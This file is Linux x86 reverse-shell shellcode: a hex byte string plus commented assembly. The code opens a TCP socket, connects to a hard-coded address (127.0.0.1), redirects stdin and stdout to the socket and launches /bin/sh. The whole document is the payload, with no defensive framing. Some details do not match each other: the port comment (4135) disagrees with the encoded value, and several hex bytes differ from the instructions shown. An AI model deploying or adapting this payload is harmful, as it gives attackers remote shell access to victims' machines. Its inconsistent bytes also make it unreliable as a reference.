;Shellcode linux/x86 reverse shell
;Author : Gaussillusion 
;Len    : 91 byte

;\x31\xc0\x31\xdb\x31\xd2\x50\xb0\x66\x43\x52
;\x6a\x01\x6a\x02\x80\xe1\xcd\x80\x66\xbe\x02
;\x00\x89\xc7\xb0\x66\xb3\x03\x68\x7f\x00\x00
;\x01\x66\x68\x27\x10\x66\x56\x89\xe2\x6a\x10
;\x52\x57\x89\xe1\xcd\x89\x31\xc9\x89\xfb\xb0
;\x3f\xb1\x00\xcd\x80\xb0\x3f\xb1\x01\xcd\x80
;\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62
;\x69\x6e\xb0\x0b\x89\xe3\x51\x89\xe2\x53\x89
;\xe1\xcd\x80


BITS 32
xor  eax,eax
xor  ebx,ebx
xor  edx,edx
push eax


; create socket
mov  al,102                           ; socketcall 0x66
inc  ebx                              ; b=1, _socket
push edx                              ; protocol = 0
push BYTE 0x1                         ; SOCK_STREAM = 1
push BYTE 0x2                         ; AF_INET = 2
mov  ecx,esp                          ; set args*
int  0x80                             ; _socket (args* = {int domain = 0x2 (AF_INET), int type = 0x1 (SOCK_STREAM), int protocol = edx,0x0 (TCP/IP)});
; eax = file descriptor on success
;jnz socketcreated                     ; if socket successful, continue, else exit cleanly
;xor eax, eax                          
;inc eax                               ; _exit 0x1
;xor ebx, ebx                          
;inc ebx                               ; status = 1
;int 0x80                              ; _exit (status);


socketcreated:
; connect to remote host
mov  si,0x2                           ; sockaddr family
mov  edi,eax                          ; store returned sockfd

mov  al,102                           ; socketcall
mov  bl,3                             ; b=3, _connect
push DWORD 0x0100007f                 ; 127.0.0.1
push WORD  0x1027                     ; port 4135
push WORD  si                         ; AF_INET = 2
mov  edx,esp                          ; set struct sockaddr*
push BYTE 16                          ; addrlen
push edx                              ; struct sockaddr*
push edi                              ; sockfd
mov  ecx,esp                          ; set args*
int  0x80                             ; _connect (args* {int sockfd = edi, const struct sockaddr *addr = {0x2, port 4135, ip 127.0.0.1}, socklen_t addrlen = 16});
; eax = 0 on success
;jz connected                          ; if connection successful, continue, else exit cleanly
;xor eax, eax                          
;inc eax                               ; _exit 0x1
;xor ebx, ebx                          
;inc ebx
;inc ebx                               ; status = 2
;int 0x80                              ; _exit (status);

connected:
xor  ecx,ecx


; dup I/O so shell sends data over socket
mov  ebx,edi                          ; oldfd = sockfd
mov  al,63                            ; _dup2 0x3f
mov  cl,0                             ; newfd, standard input
int  0x80                             ; _dup (sockfd, stdin);

mov  al,63                            ; _dup2 0x3f
mov  cl,1                             ; newfd, standard out
int  0x80                             ; _dup (sockfd, stdout);

; some people also dup stderr: 
;mov al,63
;mov cl,2
;int 0x80


; spawn shell
xor  ecx,ecx
push ecx                              ; null string termination
push 0x68732f2f
push 0x6e69622f                       ; /bin//sh

mov  al,11                            ; _execve 0xb
mov  ebx,esp                          ; filename = "/bin//sh"
push ecx                              ; generate a 32b null (empty array for envp)
mov  edx,esp                          ; envp = array of 0x0s
push ebx                              ; cmd = "/bin//sh"
mov  ecx,esp                          ; argv*
int  0x80                             ; _execve (const char* filename = "/bin//sh", char* const argv {"/bin//sh", NULL}, char* const envp {NULL});